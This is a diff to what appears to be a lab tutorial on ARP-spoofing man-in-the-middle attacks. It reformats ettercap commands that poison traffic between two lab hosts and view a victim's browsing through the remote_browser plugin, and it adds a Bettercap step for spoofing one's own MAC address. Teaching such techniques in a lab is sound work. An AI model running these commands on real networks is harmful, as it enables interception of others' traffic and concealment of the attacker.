@@ -85,9 +85,10 @@ Now that Ettercap is configured properly, we're going to run our first command w
 
 Our final command for this pass should look like this:
 
-         ```
-         sudo ettercap -T -i enp0s8 --quiet --mitm arp:remote /172.22.33.50// /172.22.33.10//80
-         ```
+         
+         sudo ettercap --text -i enp0s8 --quiet --mitm arp:remote 
+         /172.22.33.50// /172.22.33.10//80
+         
 
 Now that Ettercap has got a sense of its surroundings, let's use it to perform the spoof. Using the same options as above (hint: hit the up arrow key on your keyboard to get the full command back), tack on the following options:
 
@@ -97,9 +98,10 @@ Now that Ettercap has got a sense of its surroundings, let's use it to perform t
 
 Our final command should look like this:
 
-         ```
-         sudo ettercap -T -i enp0s8 --quiet --silent --mitm arp:remote --plugin remote_browser /172.22.33.50// /172.22.33.10/80
-         ```
+         
+         sudo ettercap --text -i enp0s8 --quiet --silent --mitm arp:remote 
+         --plugin remote_browser /172.22.33.50// /172.22.33.10/80
+         
 
 ### Introduction
 
@@ -107,6 +109,11 @@ Our final command should look like this:
 Don't forget to spoof your own hardware address first:
 
 * [SimpleSpoofMAC](https://github.com/meitar/SimpleSpoofMAC)
+
+This can also be done using Bettercap's `mac.changer` module, should one be using Bettercap. Run:
+
+    sudo bettercap
+    mac.changer on
 
 ```sh
 # Some assumptions for this demo:
